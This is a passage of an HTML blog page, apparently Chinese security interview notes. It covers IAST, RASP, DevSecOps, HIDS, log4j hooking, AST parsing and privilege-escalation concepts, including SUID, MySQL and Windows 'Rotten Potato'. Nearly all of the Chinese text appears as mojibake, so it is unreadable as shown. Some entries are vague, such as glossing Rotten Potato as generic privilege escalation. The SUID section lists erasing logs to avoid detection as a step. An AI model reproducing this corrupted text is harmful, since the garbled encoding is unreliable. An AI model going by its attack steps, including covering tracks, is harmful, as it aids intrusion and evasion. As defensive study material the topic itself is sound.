éœ€è¦æ’æ¡©ï¼Œéƒ¨ç½²æˆæœ¬è¾ƒé«˜ã€‚2. å¯¹è¿è¡Œç¯å¢ƒæœ‰ä¸€å®šä¾èµ–ã€‚3. å¯èƒ½å¯¹åº”ç”¨æ€§èƒ½äº§ç”Ÿä¸€å®šå½±å“ã€‚</td></tr></tbody></table><h3 id="ä»‹ç»ä¸‹DevSecOps"><a href="#ä»‹ç»ä¸‹DevSecOps" class="headerlink" title="ä»‹ç»ä¸‹DevSecOps"></a>ä»‹ç»ä¸‹DevSecOps</h3><p>DevSecOpsæ˜¯ä¸€ç§å°†å®‰å…¨èå…¥DevOpsæµç¨‹çš„å®è·µï¼Œå¼ºè°ƒåœ¨è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ¯ä¸ªé˜¶æ®µéƒ½è€ƒè™‘å®‰å…¨é—®é¢˜ã€‚å…¶æ ¸å¿ƒç†å¿µæ˜¯å®‰å…¨ä¸å†æ˜¯å•ç‹¬çš„é˜¶æ®µï¼Œè€Œæ˜¯è´¯ç©¿æ•´ä¸ªå¼€å‘ã€æµ‹è¯•å’Œè¿ç»´è¿‡ç¨‹ã€‚é€šè¿‡è‡ªåŠ¨åŒ–å·¥å…·ã€æŒç»­ç›‘æ§å’Œå›¢é˜Ÿåä½œï¼ŒDevSecOpsèƒ½å¤Ÿå¸®åŠ©ç»„ç»‡æ›´å¿«åœ°å‘ç°å’Œä¿®å¤å®‰å…¨é—®é¢˜ï¼Œæé«˜è½¯ä»¶çš„å®‰å…¨æ€§å’Œå¯é æ€§ã€‚å¸¸è§çš„å®è·µåŒ…æ‹¬ä½¿ç”¨è‡ªåŠ¨åŒ–å®‰å…¨æ‰«æå·¥å…·ã€å®æ–½æœ€å°æƒé™åŸåˆ™ã€è¿›è¡Œå®‰å…¨åŸ¹è®­ç­‰ã€‚</p><h3 id="IAST-ä¸»åŠ¨å’Œè¢«åŠ¨çš„åŒºåˆ«"><a href="#IAST-ä¸»åŠ¨å’Œè¢«åŠ¨çš„åŒºåˆ«" class="headerlink" title="IAST ä¸»åŠ¨å’Œè¢«åŠ¨çš„åŒºåˆ«"></a>IAST ä¸»åŠ¨å’Œè¢«åŠ¨çš„åŒºåˆ«</h3><ul><li><strong>ä¸»åŠ¨IAST</strong>ï¼šéœ€è¦å‘åŒ…å™¨å’Œagentä¸¤éƒ¨åˆ†ï¼Œå‘åŒ…å™¨è´Ÿè´£æ„é€ æµé‡ï¼Œagentè´Ÿè´£æ’æ¡©å’Œæ•è·æµé‡ã€‚ä¸»åŠ¨IASTåœ¨å…³é”®å‡½æ•°hookåˆ°æµé‡åï¼Œä¼šæ·»åŠ payloadè¿›è¡Œæ‰«æï¼Œç±»ä¼¼é»‘ç›’åŠŸèƒ½ï¼Œå¯æ£€æµ‹ä¸Šä¸‹æ–‡ç›¸å…³æ¼æ´ï¼Œä½†ä¼šäº§ç”Ÿè„æ•°æ®ï¼Œä¸”æ€§èƒ½æŸè€—è¾ƒå¤§ï¼Œéœ€é€‚é…ä¸åŒè¯­è¨€æ¡†æ¶ã€‚</li><li><strong>è¢«åŠ¨IAST</strong>ï¼šåªéœ€agentéƒ¨åˆ†ï¼Œé€šè¿‡æ±¡ç‚¹åˆ†ææŠ€æœ¯æ£€æµ‹æ¼æ´ï¼Œä¸ä¼šä¸»åŠ¨å‘é€payloadï¼Œæ— è„æ•°æ®äº§ç”Ÿï¼Œå¯¹ä¸šåŠ¡æµ‹è¯•æ— å½±å“ï¼Œä½†æ— æ³•æ£€æµ‹æœªè§¦å‘ä»£ç è·¯å¾„çš„æ¼æ´ã€‚</li></ul><h3 id="IASTåœ¨CI-CDä¸­çš„ä½ç½®"><a href="#IASTåœ¨CI-CDä¸­çš„ä½ç½®" class="headerlink" title="IASTåœ¨CI&#x2F;CDä¸­çš„ä½ç½®"></a>IASTåœ¨CI&#x2F;CDä¸­çš„ä½ç½®</h3><p>IASTå¯ä»¥æ”¾åœ¨CI&#x2F;CDçš„æµ‹è¯•é˜¶æ®µï¼Œä¹Ÿå¯ä»¥æ”¾åœ¨å¼€å‘é˜¶æ®µå’Œç”Ÿäº§é˜¶æ®µã€‚åœ¨æµ‹è¯•é˜¶æ®µï¼ŒIASTå¯ä»¥ä¸è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬ç»“åˆï¼Œå®æ—¶æ£€æµ‹æ¼æ´ï¼›åœ¨å¼€å‘é˜¶æ®µï¼Œå¯å¸®åŠ©å¼€å‘äººå‘˜åŠæ—¶å‘ç°å’Œä¿®å¤æ¼æ´ï¼›åœ¨ç”Ÿäº§é˜¶æ®µï¼Œå¯ç›‘æ§è¿è¡Œä¸­çš„åº”ç”¨ç¨‹åºï¼ŒåŠæ—¶å‘ç°å’Œå¤„ç†å®‰å…¨é—®é¢˜ã€‚</p><h3 id="ASTçš„å®šä¹‰"><a href="#ASTçš„å®šä¹‰" class="headerlink" title="ASTçš„å®šä¹‰"></a>ASTçš„å®šä¹‰</h3><p>ASTï¼ˆAbstract Syntax Treeï¼‰æ˜¯æŠ½è±¡è¯­æ³•æ ‘ï¼Œæ˜¯æºä»£ç çš„æŠ½è±¡è¡¨ç¤ºï¼Œå®ƒä»¥æ ‘çŠ¶ç»“æ„å±•ç¤ºä»£ç çš„è¯­æ³•ç»“æ„ï¼Œå¿½ç•¥äº†ä¸å¿…è¦çš„ç»†èŠ‚ï¼Œå¦‚ç©ºæ ¼ã€æ³¨é‡Šç­‰ï¼Œæ˜¯ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨å¯¹ä»£ç è¿›è¡Œåˆ†æå’Œå¤„ç†çš„åŸºç¡€ã€‚</p><h3 id="ä»£ç ç”ŸæˆASTçš„æ–¹æ³•"><a href="#ä»£ç ç”ŸæˆASTçš„æ–¹æ³•" class="headerlink" title="ä»£ç ç”ŸæˆASTçš„æ–¹æ³•"></a>ä»£ç ç”ŸæˆASTçš„æ–¹æ³•</h3><p>ä»¥Pythonä¸ºä¾‹ï¼Œå¯ä»¥ä½¿ç”¨Pythonçš„astæ¨¡å—æ¥ç”ŸæˆASTï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def hello_world():</span></span><br><span class="line"><span class="string">    print(&quot;Hello, World!&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tree = ast.parse(code)</span><br><span class="line"><span class="built_in">print</span>(ast.dump(tree))</span><br></pre></td></tr></table></figure><h3 id="ä¸ç»è¿‡IRé˜¶æ®µç”ŸæˆASTçš„æ–¹æ³•åŠå…¶ç¼ºé™·"><a href="#ä¸ç»è¿‡IRé˜¶æ®µç”ŸæˆASTçš„æ–¹æ³•åŠå…¶ç¼ºé™·" class="headerlink" title="ä¸ç»è¿‡IRé˜¶æ®µç”ŸæˆASTçš„æ–¹æ³•åŠå…¶ç¼ºé™·"></a>ä¸ç»è¿‡IRé˜¶æ®µç”ŸæˆASTçš„æ–¹æ³•åŠå…¶ç¼ºé™·</h3><ul><li><strong>æ–¹æ³•</strong>ï¼šç›´æ¥è§£ææºä»£ç ç”ŸæˆASTï¼Œæ— éœ€ç»è¿‡ä¸­é—´è¡¨ç¤ºï¼ˆIRï¼‰é˜¶æ®µã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨è¯æ³•åˆ†æå™¨å’Œè¯­æ³•åˆ†æå™¨ç›´æ¥ä»æºä»£ç ç”ŸæˆASTã€‚</li><li><strong>ç¼ºé™·</strong>ï¼š<ul><li><strong>æ€§èƒ½é—®é¢˜</strong>ï¼šç›´æ¥è§£ææºä»£ç ç”ŸæˆASTå¯èƒ½éœ€è¦æ›´å¤šçš„è®¡ç®—èµ„æºå’Œæ—¶é—´ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤æ‚ä»£ç æ—¶ã€‚</li><li><strong>å…¼å®¹æ€§é—®é¢˜</strong>ï¼šä¸åŒç¼–ç¨‹è¯­è¨€çš„è¯­æ³•å’Œç»“æ„å·®å¼‚è¾ƒå¤§ï¼Œç›´æ¥è§£æå¯èƒ½éœ€è¦é’ˆå¯¹æ¯ç§è¯­è¨€å®ç°ç‰¹å®šçš„è§£æå™¨ï¼Œå¢åŠ äº†å¼€å‘å’Œç»´æŠ¤çš„éš¾åº¦ã€‚</li><li><strong>æ‰©å±•æ€§é—®é¢˜</strong>ï¼šå¦‚æœéœ€è¦å¯¹ASTè¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†æˆ–ä¼˜åŒ–ï¼Œç›´æ¥è§£æç”Ÿæˆçš„ASTå¯èƒ½ä¸å¤Ÿçµæ´»ï¼Œéš¾ä»¥é€‚åº”ä¸åŒçš„éœ€æ±‚ã€‚</li></ul></li></ul><h3 id="HIDSçš„æµç¨‹"><a href="#HIDSçš„æµç¨‹" class="headerlink" title="HIDSçš„æµç¨‹"></a>HIDSçš„æµç¨‹</h3><p>HIDSï¼ˆHost-based Intrusion Detection Systemï¼‰çš„æµç¨‹é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li><strong>æ•°æ®æ”¶é›†</strong>ï¼šæ”¶é›†ç³»ç»Ÿæ—¥å¿—ã€ç½‘ç»œæµé‡ã€æ–‡ä»¶ç³»ç»Ÿå˜åŒ–ç­‰ä¿¡æ¯ã€‚</li><li><strong>æ•°æ®åˆ†æ</strong>ï¼šå¯¹æ”¶é›†åˆ°çš„æ•°æ®è¿›è¡Œåˆ†æï¼Œæ£€æµ‹å¼‚å¸¸è¡Œä¸ºå’Œæ½œåœ¨çš„å…¥ä¾µæ´»åŠ¨ã€‚</li><li><strong>å“åº”å¤„ç†</strong>ï¼šæ ¹æ®åˆ†æç»“æœé‡‡å–ç›¸åº”çš„æªæ–½ï¼Œå¦‚å‘å‡ºè­¦æŠ¥ã€é˜»æ­¢å¯ç–‘è¿æ¥ã€éš”ç¦»å—æ„ŸæŸ“çš„ç³»ç»Ÿç­‰ã€‚</li><li><strong>æŠ¥å‘Šç”Ÿæˆ</strong>ï¼šç”Ÿæˆè¯¦ç»†çš„æŠ¥å‘Šï¼Œè®°å½•æ£€æµ‹åˆ°çš„äº‹ä»¶å’Œé‡‡å–çš„æªæ–½ï¼Œä»¥ä¾¿åç»­çš„å®¡è®¡å’Œåˆ†æã€‚</li></ol><h3 id="ææƒçš„æ–¹æ³•"><a href="#ææƒçš„æ–¹æ³•" class="headerlink" title="ææƒçš„æ–¹æ³•"></a>ææƒçš„æ–¹æ³•</h3><ul><li><strong>suidææƒ</strong>ï¼šåˆ©ç”¨å…·æœ‰suidæƒé™çš„ç¨‹åºï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„è¾“å…¥æˆ–åˆ©ç”¨ç¨‹åºä¸­çš„æ¼æ´ï¼Œä½¿æ™®é€šç”¨æˆ·èƒ½å¤Ÿä»¥rootæƒé™æ‰§è¡Œä»£ç ï¼Œä»è€Œæå‡æƒé™ã€‚</li><li><strong>MySQLææƒ</strong>ï¼šé€šè¿‡åˆ©ç”¨MySQLçš„æŸäº›ç‰¹æ€§æˆ–æ¼æ´ï¼Œå¦‚æ–‡ä»¶å†™å…¥ã€å‘½ä»¤æ‰§è¡Œç­‰ï¼Œè·å–æ›´é«˜çš„æƒé™ã€‚</li></ul><h3 id="suidææƒçš„ç”Ÿå‘½å‘¨æœŸ"><a href="#suidææƒçš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="suidææƒçš„ç”Ÿå‘½å‘¨æœŸ"></a>suidææƒçš„ç”Ÿå‘½å‘¨æœŸ</h3><p>suidææƒçš„ç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªé˜¶æ®µï¼š</p><ol><li><strong>å‘ç°suidæ–‡ä»¶</strong>ï¼šæŸ¥æ‰¾ç³»ç»Ÿä¸­å…·æœ‰suidæƒé™çš„æ–‡ä»¶ã€‚</li><li><strong>åˆ†ææ¼æ´</strong>ï¼šåˆ†æè¿™äº›æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ã€‚</li><li><strong>æ„é€ åˆ©ç”¨</strong>ï¼šæ ¹æ®æ¼æ´æ„é€ ç›¸åº”çš„åˆ©ç”¨ä»£ç æˆ–è¾“å…¥ã€‚</li><li><strong>è·å–æƒé™</strong>ï¼šæ‰§è¡Œåˆ©ç”¨ä»£ç ï¼Œæå‡æƒé™ã€‚</li><li><strong>æ¸…ç†ç—•è¿¹</strong>ï¼šåˆ é™¤æ—¥å¿—ã€æ¢å¤ç³»ç»ŸçŠ¶æ€ç­‰ï¼Œé¿å…è¢«å‘ç°ã€‚</li></ol><h3 id="Windows-çƒ‚åœŸè±†"><a href="#Windows-çƒ‚åœŸè±†" class="headerlink" title="Windows çƒ‚åœŸè±†"></a>Windows çƒ‚åœŸè±†</h3><p>Windows çƒ‚åœŸè±†ï¼ˆWindows Privilege Escalationï¼‰æ˜¯ä¸€ç§åˆ©ç”¨Windowsç³»ç»Ÿä¸­çš„æƒé™æå‡æŠ€æœ¯çš„æ‰‹æ®µã€‚å®ƒé€šå¸¸æ¶‰åŠåˆ©ç”¨ç³»ç»Ÿä¸­çš„æ¼æ´ã€é…ç½®é”™è¯¯æˆ–ç‰¹å®šçš„ç¨‹åºè¡Œä¸ºæ¥æå‡ç”¨æˆ·çš„æƒé™ï¼Œä»è€Œè·å¾—æ›´é«˜çš„è®¿é—®æƒé™ã€‚å¸¸è§çš„Windowsææƒæ–¹æ³•åŒ…æ‹¬åˆ©ç”¨æœåŠ¡æƒé™ã€DLLæ³¨å…¥ã€ä»¤ç‰Œçªƒå–ç­‰ã€‚</p><h3 id="IASTå’ŒRASPçš„åŒºåˆ«"><a href="#IASTå’ŒRASPçš„åŒºåˆ«" class="headerlink" title="IASTå’ŒRASPçš„åŒºåˆ«"></a>IASTå’ŒRASPçš„åŒºåˆ«</h3><ul><li><strong>å®šä¹‰ä¸å·¥ä½œåŸç†</strong>ï¼š<ul><li><strong>IASTï¼ˆInteractive Application Security Testingï¼‰</strong>ï¼šæ˜¯ä¸€ç§ç»“åˆäº†SASTå’ŒDASTä¼˜ç‚¹çš„å®‰å…¨æµ‹è¯•æŠ€æœ¯ï¼Œé€šè¿‡åœ¨åº”ç”¨ç¨‹åºä¸­æ¤å…¥æ¢é’ˆï¼Œåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°ç›‘æµ‹å’ŒæŠ¥å‘Šå®‰å…¨æ¼æ´ã€‚å®ƒå¯ä»¥åœ¨æµ‹è¯•é˜¶æ®µå¯¹åº”ç”¨ç¨‹åºè¿›è¡Œå®‰å…¨æ£€æµ‹ï¼Œè¯†åˆ«å‡ºSASTå’ŒDASTå·¥å…·å¯èƒ½é—æ¼çš„å®‰å…¨æ¼æ´ã€‚</li><li><strong>RASPï¼ˆRuntime Application Self-Protectionï¼‰</strong>ï¼šæ˜¯ä¸€ç§åº”ç”¨ç¨‹åºä¿æŠ¤æŠ€æœ¯ï¼Œå®ƒåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ç›‘è§†å’Œä¿æŠ¤åº”ç”¨ç¨‹åºå…å—æ”»å‡»ã€‚RASPä½¿ç”¨è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ä¿¡æ¯å’Œå®‰å…¨ç­–ç•¥æ¥æ£€æµ‹å’Œé˜²æ­¢æ”»å‡»ï¼Œå¹¶ä¸”å¯ä»¥ä¸»åŠ¨å“åº”å’Œé˜»æ­¢æ½œåœ¨çš„å®‰å…¨å¨èƒã€‚</li></ul></li><li><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š<ul><li><strong>IAST</strong>ï¼šä¸»è¦ç”¨äºåº”ç”¨ä¸Šçº¿å‰çš„æµ‹è¯•é˜¶æ®µï¼Œå¸®åŠ©å¼€å‘å›¢é˜Ÿåœ¨å¼€å‘è¿‡ç¨‹ä¸­å°½æ—©å‘ç°å’Œä¿®å¤å®‰å…¨æ¼æ´ï¼Œé™ä½åæœŸä¿®å¤æˆæœ¬å’Œé£é™©ã€‚</li><li><strong>RASP</strong>ï¼šä¸»è¦ç”¨äºç”Ÿäº§ç¯å¢ƒï¼Œä¸ºå·²ç»ä¸Šçº¿çš„åº”ç”¨ç¨‹åºæä¾›å®æ—¶çš„ä¿æŠ¤ï¼Œèƒ½å¤ŸåŠæ—¶å‘ç°å¹¶é˜»æ–­æ”»å‡»ï¼Œå‡å°‘å®‰å…¨äº‹ä»¶çš„å‘ç”Ÿã€‚</li></ul></li><li><strong>æ£€æµ‹ç²’åº¦</strong>ï¼š<ul><li><strong>IAST</strong>ï¼šæ›´å…³æ³¨äºä»£ç å±‚é¢çš„å®‰å…¨æ¼æ´æ£€æµ‹ï¼Œèƒ½å¤Ÿç²¾ç¡®åˆ°å…·ä½“çš„ä»£ç è¡Œæˆ–å‡½æ•°è°ƒç”¨ï¼Œä¸ºå¼€å‘äººå‘˜æä¾›è¯¦ç»†çš„æ¼æ´ä¿¡æ¯å’Œä¿®å¤å»ºè®®ã€‚</li><li><strong>RASP</strong>ï¼šæ›´å…³æ³¨äºåº”ç”¨ç¨‹åºè¿è¡Œæ—¶çš„è¡Œä¸ºå’ŒçŠ¶æ€ï¼Œæ£€æµ‹èŒƒå›´æ›´å¹¿æ³›ï¼ŒåŒ…æ‹¬åº”ç”¨ç¨‹åºçš„è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ã€ç³»ç»Ÿè°ƒç”¨ã€ç½‘ç»œé€šä¿¡ç­‰ï¼Œèƒ½å¤Ÿè¯†åˆ«å’Œé˜»æ­¢å„ç§æ”»å‡»è¡Œä¸ºã€‚</li></ul></li><li><strong>æ€§èƒ½å½±å“</strong>ï¼š<ul><li><strong>IAST</strong>ï¼šåœ¨æµ‹è¯•é˜¶æ®µè¿è¡Œï¼Œå¯¹åº”ç”¨ç¨‹åºæ€§èƒ½çš„å½±å“ç›¸å¯¹è¾ƒå°ï¼Œå› ä¸ºæµ‹è¯•ç¯å¢ƒé€šå¸¸ä¸ä¼šå¯¹æ€§èƒ½æœ‰æé«˜çš„è¦æ±‚ã€‚</li><li><strong>RASP</strong>ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œï¼Œä¼šå¯¹åº”ç”¨ç¨‹åºæ€§èƒ½äº§ç”Ÿä¸€å®šçš„å½±å“ï¼Œä½†ä¸€èˆ¬åœ¨å¯æ¥å—èŒƒå›´å†…ï¼Œå¦‚RASPå¸¦æ¥çš„æ€§èƒ½æ¶ˆè€—ä¸€èˆ¬åœ¨5%~10%ä¹‹é—´ã€‚</li></ul></li><li><strong>è¯¯æŠ¥å’Œæ¼æŠ¥ç‡</strong>ï¼š<ul><li><strong>IAST</strong>ï¼šç”±äºå…¶æ£€æµ‹ç²’åº¦è¾ƒç»†ï¼Œå¯èƒ½ä¼šå­˜åœ¨ä¸€å®šçš„è¯¯æŠ¥å’Œæ¼æŠ¥æƒ…å†µï¼Œéœ€è¦å¼€å‘äººå‘˜å¯¹æ£€æµ‹ç»“æœè¿›è¡Œåˆ†æå’Œç¡®è®¤ã€‚</li><li><strong>RASP</strong>ï¼šé€šè¿‡è¿è¡Œæ—¶ä¸Šä¸‹æ–‡çš„åˆ†æå’Œåˆ¤æ–­ï¼Œèƒ½å¤Ÿæ›´å‡†ç¡®åœ°è¯†åˆ«æ”»å‡»è¡Œä¸ºï¼Œè¯¯æŠ¥å’Œæ¼æŠ¥ç‡ç›¸å¯¹è¾ƒä½ã€‚</li></ul></li></ul><h3 id="IASTå’ŒRASPåœ¨åŸ‹ç‚¹æ·±æµ…ä¸Šçš„å¤„ç†"><a href="#IASTå’ŒRASPåœ¨åŸ‹ç‚¹æ·±æµ…ä¸Šçš„å¤„ç†" class="headerlink" title="IASTå’ŒRASPåœ¨åŸ‹ç‚¹æ·±æµ…ä¸Šçš„å¤„ç†"></a>IASTå’ŒRASPåœ¨åŸ‹ç‚¹æ·±æµ…ä¸Šçš„å¤„ç†</h3><ul><li><strong>IAST</strong>ï¼šåŸ‹ç‚¹ç›¸å¯¹è¾ƒæµ…ï¼Œä¸»è¦æ˜¯åœ¨åº”ç”¨ç¨‹åºçš„å…³é”®å‡½æ•°æˆ–æ¨¡å—ä¸­æ’å…¥æ¢é’ˆï¼Œä»¥æ”¶é›†è¿è¡Œæ—¶çš„æ•°æ®å’Œä¿¡æ¯ï¼Œç”¨äºæ¼æ´æ£€æµ‹ã€‚ä¾‹å¦‚ï¼Œåœ¨å¤„ç†ç”¨æˆ·è¾“å…¥çš„å‡½æ•°ã€æ•°æ®åº“æ“ä½œå‡½æ•°ç­‰å¤„è¿›è¡ŒåŸ‹ç‚¹ï¼Œç›‘æµ‹æ•°æ®çš„æµå‘å’Œæ“ä½œè¡Œä¸ºï¼Œä»¥å‘ç°æ½œåœ¨çš„æ³¨å…¥æ¼æ´ã€è·¨ç«™è„šæœ¬æ¼æ´ç­‰ã€‚</li><li><strong>RASP</strong>ï¼šåŸ‹ç‚¹è¾ƒæ·±ï¼Œä¸ä»…åœ¨åº”ç”¨ç¨‹åºçš„å‡½æ•°å’Œæ¨¡å—å±‚é¢è¿›è¡Œç›‘æµ‹ï¼Œè¿˜ä¼šæ·±å…¥åˆ°ç³»ç»Ÿè°ƒç”¨ã€ç½‘ç»œé€šä¿¡ç­‰åº•å±‚å±‚é¢ã€‚ä¾‹å¦‚ï¼Œå¯¹æ“ä½œç³»ç»Ÿçš„APIè°ƒç”¨è¿›è¡Œç›‘æ§ï¼Œæ£€æµ‹æ˜¯å¦æœ‰å¼‚å¸¸çš„æ–‡ä»¶è®¿é—®ã€è¿›ç¨‹åˆ›å»ºç­‰è¡Œä¸ºï¼›å¯¹ç½‘ç»œæ•°æ®åŒ…è¿›è¡Œåˆ†æï¼Œè¯†åˆ«æ˜¯å¦å­˜åœ¨æ¶æ„çš„æ”»å‡»æµé‡ã€‚</li></ul><h3 id="åŸ‹ç‚¹æ·±æµ…å¯¹æ£€å‡ºç‡çš„å½±å“"><a href="#åŸ‹ç‚¹æ·±æµ…å¯¹æ£€å‡ºç‡çš„å½±å“" class="headerlink" title="åŸ‹ç‚¹æ·±æµ…å¯¹æ£€å‡ºç‡çš„å½±å“"></a>åŸ‹ç‚¹æ·±æµ…å¯¹æ£€å‡ºç‡çš„å½±å“</h3><ul><li><strong>åŸ‹ç‚¹æµ…</strong>ï¼šä¼˜ç‚¹æ˜¯æ€§èƒ½å½±å“å°ï¼Œä¸ä¼šå¯¹åº”ç”¨ç¨‹åºçš„æ­£å¸¸è¿è¡Œé€ æˆå¤ªå¤§è´Ÿæ‹…ï¼›ç¼ºç‚¹æ˜¯æ£€æµ‹èŒƒå›´æœ‰é™ï¼Œå¯èƒ½æ— æ³•å‘ç°ä¸€äº›æ·±å±‚æ¬¡çš„ã€éšè—çš„æ¼æ´æˆ–æ”»å‡»è¡Œä¸ºï¼Œæ£€å‡ºç‡ç›¸å¯¹è¾ƒä½ã€‚</li><li><strong>åŸ‹ç‚¹æ·±</strong>ï¼šèƒ½å¤Ÿæ›´å…¨é¢åœ°ç›‘æµ‹åº”ç”¨ç¨‹åºçš„è¿è¡ŒçŠ¶æ€å’Œè¡Œä¸ºï¼Œæ£€æµ‹åˆ°æ›´å¤šæ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼Œæé«˜æ£€å‡ºç‡ï¼›ä½†åŒæ—¶ä¹Ÿä¼šå¢åŠ æ€§èƒ½å¼€é”€ï¼Œå¯¹åº”ç”¨ç¨‹åºçš„è¿è¡Œæ•ˆç‡äº§ç”Ÿä¸€å®šå½±å“ã€‚</li></ul><h3 id="log4jåšåŸ‹ç‚¹çš„ä¸¤ç§æ–¹å¼åŠå…¶åŒºåˆ«"><a href="#log4jåšåŸ‹ç‚¹çš„ä¸¤ç§æ–¹å¼åŠå…¶åŒºåˆ«" class="headerlink" title="log4jåšåŸ‹ç‚¹çš„ä¸¤ç§æ–¹å¼åŠå…¶åŒºåˆ«"></a>log4jåšåŸ‹ç‚¹çš„ä¸¤ç§æ–¹å¼åŠå…¶åŒºåˆ«</h3><ul><li><strong>ç›´æ¥åœ¨log4jçš„Classé‡Œåšhook</strong>ï¼š<ul><li><strong>ä¼˜ç‚¹</strong>ï¼šå¯ä»¥å…¨é¢åœ°ç›‘æ§log4jçš„æ‰€æœ‰æ—¥å¿—è®°å½•æ“ä½œï¼Œèƒ½å¤ŸåŠæ—¶å‘ç°ä»»ä½•é€šè¿‡log4jè¾“å‡ºçš„æ¶æ„æ—¥å¿—ä¿¡æ¯ï¼Œå¦‚åŒ…å«æ¶æ„payloadçš„æ—¥å¿—è®°å½•ã€‚</li><li><strong>ç¼ºç‚¹</strong>ï¼šå¯èƒ½ä¼šäº§ç”Ÿè¾ƒå¤šçš„è¯¯æŠ¥ï¼Œå› ä¸ºå¹¶éæ‰€æœ‰çš„æ—¥å¿—è®°å½•æ“ä½œéƒ½æ˜¯æ”»å‡»è¡Œä¸ºï¼›è€Œä¸”å¯¹log4jçš„æ€§èƒ½å¯èƒ½ä¼šæœ‰ä¸€å®šå½±å“ï¼Œå°¤å…¶æ˜¯åœ¨æ—¥å¿—è®°å½•é¢‘ç¹çš„æƒ…å†µä¸‹ã€‚</li></ul></li><li><strong>ç›´æ¥hook jndiçš„initialå’Œlookup</strong>ï¼š<ul><li><strong>ä¼˜ç‚¹</strong>ï¼šæ›´ç²¾å‡†åœ°é’ˆå¯¹log4jæ¼æ´çš„åˆ©ç”¨æ–¹å¼è¿›è¡Œç›‘æµ‹ï¼Œèƒ½å¤Ÿæœ‰æ•ˆè¯†åˆ«å’Œé˜»æ–­åˆ©ç”¨jndiè¿›è¡Œçš„æ¶æ„è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»ï¼Œå‡å°‘è¯¯æŠ¥ã€‚</li><li><strong>ç¼ºç‚¹</strong>ï¼šå¯èƒ½ä¼šé—æ¼ä¸€äº›é€šè¿‡å…¶ä»–æ–¹å¼åˆ©ç”¨log4jæ¼æ´çš„æ”»å‡»è¡Œä¸ºï¼Œæ£€æµ‹èŒƒå›´ç›¸å¯¹è¾ƒçª„ã€‚</li></ul></li></ul><h3 id="ç™¾åº¦çš„IASTå®ç°åŠä¸»åŠ¨å¼å’Œè¢«åŠ¨å¼çš„åŒºåˆ«"><a href="#ç™¾åº¦çš„IASTå®ç°åŠä¸»åŠ¨å¼å’Œè¢«åŠ¨å¼çš„åŒºåˆ«" class="headerlink" title="ç™¾åº¦çš„IASTå®ç°åŠä¸»åŠ¨å¼å’Œè¢«åŠ¨å¼çš„åŒºåˆ«"></a>ç™¾åº¦çš„IASTå®ç°åŠä¸»åŠ¨å¼å’Œè¢«åŠ¨å¼çš„åŒºåˆ«</h3><ul><li><strong>ç™¾åº¦çš„IAST</strong>ï¼šç™¾åº¦çš„IASTè§£å†³æ–¹æ¡ˆç»“åˆäº†åŠ¨æ€æ±¡ç‚¹è¿½è¸ªæŠ€æœ¯ï¼Œåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶å¯¹æ•°æ®æµè¿›è¡Œç›‘æµ‹å’Œåˆ†æï¼Œèƒ½å¤Ÿå‡†ç¡®åœ°è¯†åˆ«å‡ºæ¼æ´çš„åˆ©ç”¨è·¯å¾„å’Œå½±å“èŒƒå›´ã€‚å®ƒé€šè¿‡åœ¨åº”ç”¨ç¨‹åºä¸­æ¤å…¥æ¢é’ˆï¼Œæ”¶é›†è¿è¡Œæ—¶çš„æ•°æ®å’Œä¿¡æ¯ï¼Œç„¶ååˆ©ç”¨æ±¡ç‚¹ä¼ æ’­æ¨¡å‹è¿›è¡Œåˆ†æï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨å®‰å…¨æ¼æ´ã€‚</li><li><strong>ä¸»åŠ¨å¼å’Œè¢«åŠ¨å¼çš„åŒºåˆ«</strong>ï¼š<ul><li><strong>ä¸»åŠ¨å¼</strong>ï¼šä¸»åŠ¨å¼IASTä¼šä¸»åŠ¨å‘åº”ç”¨ç¨‹åºå‘é€æµ‹è¯•è¯·æ±‚ï¼Œæ¨¡æ‹Ÿå„ç§æ”»å‡»è¡Œä¸ºï¼Œä»¥æ£€æµ‹åº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨æ¼æ´ã€‚è¿™ç§æ–¹å¼èƒ½å¤Ÿæ›´å…¨é¢åœ°è¦†ç›–åº”ç”¨ç¨‹åºçš„åŠŸèƒ½å’Œä»£ç 